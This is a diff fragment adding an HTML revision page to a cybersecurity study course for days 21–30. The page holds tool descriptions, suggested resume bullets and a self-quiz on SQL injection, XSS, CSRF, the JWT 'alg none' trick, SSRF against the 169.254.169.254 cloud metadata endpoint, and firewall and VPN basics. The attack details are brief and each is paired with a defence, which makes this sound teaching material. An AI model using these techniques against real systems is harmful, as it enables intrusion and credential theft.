+      <div class="ai-pill"><div class="aname">Snort / Suricata</div><div class="adesc">IDS/IPS engines with community rule sets. AI tuning reduces false positives by 60%+.</div></div>
+      <div class="ai-pill"><div class="aname">AWS GuardDuty</div><div class="adesc">AI-driven threat detection for cloud. Learns normal baseline, alerts on anomalies in IAM/S3/network.</div></div>
+    </div>
+  </div>
+
+  <!-- RESUME BULLETS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--green);">💼</div>
+      <div class="day-meta">
+        <div class="day-title">Resume Bullets — Days 21–30</div>
+        <span class="day-incident">Lift these directly into your resume now</span>
+      </div>
+    </div>
+    <div class="job-grid">
+      <div class="job-box"><div class="day-ref">Day 21–23</div><div class="bullet">"Performed OWASP Top 10-based security assessments including SQL injection testing (UNION, error-based, blind) against web applications using Burp Suite and sqlmap."</div></div>
+      <div class="job-box"><div class="day-ref">Day 24</div><div class="bullet">"Exploited stored, reflected, and DOM-based XSS in controlled environments; implemented Content-Security-Policy headers and input sanitization for script injection prevention."</div></div>
+      <div class="job-box"><div class="day-ref">Day 25</div><div class="bullet">"Identified and demonstrated CSRF and session hijacking attack vectors; deployed SameSite cookie attributes and anti-CSRF tokens to mitigate cross-site request forgery."</div></div>
+      <div class="job-box"><div class="day-ref">Day 26</div><div class="bullet">"Assessed authentication and authorization controls including JWT token manipulation, credential stuffing, and RBAC bypass techniques; documented algorithm confusion attack vectors."</div></div>
+      <div class="job-box"><div class="day-ref">Day 27–28</div><div class="bullet">"Audited security misconfigurations (open S3 buckets, default credentials, directory listing) and conducted SSRF/testing against cloud metadata endpoints for privilege escalation."</div></div>
+      <div class="job-box"><div class="day-ref">Day 29–30</div><div class="bullet">"Configured iptables firewall rules, Snort IDS/IPS policies, and OpenVPN tunnels; analyzed traffic routing between forward/reverse proxies and encrypted tunnel architectures."</div></div>
+    </div>
+  </div>
+
+  <!-- QUIZ -->
+  <div class="quiz-section">
+    <h2>// Quick Self-Quiz — Can You Answer These Without Looking?</h2>
+    <p class="sub">Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing.</p>
+
+    <div class="q-item">
+      <div class="qnum">Q01</div>
+      <div class="qtext">What three mental-model buckets organize the OWASP Top 10? Give an example from each.</div>
+      <div class="ans">Bad Input Handling (SQLi, XSS), Bad Access Decisions (broken auth, IDOR, CSRF), Bad Hygiene (vulnerable components, misconfiguration, logging failures).</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q02</div>
+      <div class="qtext">How does a parameterized query prevent SQL injection at the database engine level?</div>
+      <div class="ans">SQL structure is compiled with placeholders first, then user input is sent as data — the engine cannot interpret it as SQL code even if it contains quotes or UNION keywords.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q03</div>
+      <div class="qtext">What is the difference between stored, reflected, and DOM-based XSS?</div>
+      <div class="ans">Stored = payload saved on server (comment field). Reflected = payload in URL/request param. DOM-based = payload in URL hash, never reaches server — manipulated client-side by JS.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q04</div>
+      <div class="qtext">How did the Magecart attack on British Airways steal payment details without breaking HTTPS?</div>
+      <div class="ans">Injected JS via third-party script read form fields before HTTPS submission and exfiltrated to attacker domain. No SRI on scripts plus no CSP meant injected code had full page access.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q05</div>
+      <div class="qtext">What is a CSRF attack and what two defenses prevent it?</div>
+      <div class="ans">Forge authenticated request using victim's cookies sent automatically. Defenses: anti-CSRF tokens in forms AND SameSite=Strict/Strict cookie attribute.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q06</div>
+      <div class="qtext">Walk through the JWT algorithm confusion attack. What header value do you change and why does it work?</div>
+      <div class="ans">Change "alg":"HS256" to "alg":"none". Some libraries skip signature verification when alg=none. Prevention: whitelist allowed algorithms server-side instead of trusting the token header.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q07</div>
+      <div class="qtext">How did the Capital One SSRF attack work? What two misconfigurations allowed it?</div>
+      <div class="ans">SSRF to 169.254.169.254 (AWS metadata) returned IAM credentials. Two misconfigurations: WAF allowed SSRF, and the IAM role had read access to 100M+ S3 records it didn't need.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q08</div>
+      <div class="qtext">What does iptables -P INPUT DROP do? Why is it a better baseline than allowing everything?</div>
+      <div class="ans">Sets default policy to DROP — any traffic without an explicit ACCEPT rule is silently dropped. Forces you to whitelist specific ports instead of blacklisting — far more secure.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q09</div>
+      <div class="qtext">What is the difference between a VPN and a proxy? When would you use each?</div>
+      <div class="ans">VPN tunnels ALL traffic at OSI L3 — entire device encrypted. Proxy handles single app at L7. Use VPN for full privacy (public Wi-Fi). Use proxy for one-off routing (access geo-blocked content in browser only).</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q10</div>
+      <div class="qtext">Why did Perfect Forward Secrecy protect NordVPN customers even after the datacenter breach exposed private keys?</div>
+      <div class="ans">PFS generates unique session keys per connection using ephemeral Diffie-Hellman. Even with the server's long-term private key, an attacker cannot decrypt past recorded sessions — each session's key is independently generated and discarded.</div>
+    </div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">// next up — day 31</div>
+      <div class="title">Malware Types, Social Engineering &amp; Phase 3 — Offensive Security</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>revision complete — open revision_day31_40.html when you're ready.</footer>
+
+</div>
+</body>
+</html>
